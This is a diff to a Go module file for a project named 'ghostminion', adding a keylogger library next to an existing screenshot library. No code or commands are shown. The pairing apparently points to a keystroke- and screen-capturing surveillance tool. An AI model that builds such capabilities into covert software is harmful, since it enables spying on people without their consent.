@@ -2,7 +2,10 @@ module ghostminion
 
 go 1.24.1
 
-require github.com/kbinani/screenshot v0.0.0-20250118074034-a3924b7bbc8c
+require (
+	github.com/MarinX/keylogger v0.0.0-20240620105846-48ca9d01f566
+	github.com/kbinani/screenshot v0.0.0-20250118074034-a3924b7bbc8c
+)
 
 require (
 	github.com/gen2brain/shm v0.1.0 // indirect
